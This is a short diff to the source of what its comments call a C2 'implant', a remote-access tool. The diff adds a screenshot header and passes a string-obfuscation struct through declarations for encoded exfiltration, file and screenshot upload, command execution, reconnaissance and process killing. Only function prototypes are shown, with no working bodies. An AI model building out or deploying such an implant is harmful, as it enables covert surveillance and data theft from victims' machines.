@@ -2,8 +2,8 @@
 
 #include<iostream>
 #include <iomanip>
-#include<Windows.h>
-#include<WinInet.h>
+#include <Windows.h>
+#include <WinInet.h>
 #include <tchar.h>
 #include <iphlpapi.h>
 #include <tlhelp32.h>
@@ -13,6 +13,7 @@
 
 #include "util.h"
 #include "config.h"
+#include "screenshot.h"
 
 #define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
 #define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
@@ -24,15 +25,15 @@
 // The core functions of the implant 
 // Alll of these are either used for C2 <-> implant communication or executing a task from the C2
 
-std::string sendEncodedString(std::string key, std::string data, std::string endpoint, HANDLE hConnect);
-BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey, std::string endpoint);
-BOOL doScreenshotUpload(HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std::string endpoint);
+std::string sendEncodedString(struct Strings* strings, std::string key, std::string data, std::string endpoint, HANDLE hConnect);
+BOOL doFileUpload(struct Strings* strings, HANDLE hConnect, char* filepath, int xorKey, std::string endpoint);
+BOOL doScreenshotUpload(struct Strings* strings, HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std::string endpoint);
 BOOL doFileDownload(std::string url, std::string filepath);
-std::string execCmd(std::string cmd, DWORD MAX_TIME);
+std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME);
 std::string sendRequestGetResponse(HANDLE hRequest);
-std::string getOSInfo();
+std::string getOSInfo(struct Strings* strings);
 std::string getPublicIP(HANDLE hInternet);
 std::string getProcToStr();
 BOOLEAN killProcess(DWORD pid);
 std::string getNetworkInfo();
-std::string gatherInfo(HANDLE hInternet);
+std::string gatherInfo(struct Strings* strings, HANDLE hInternet);
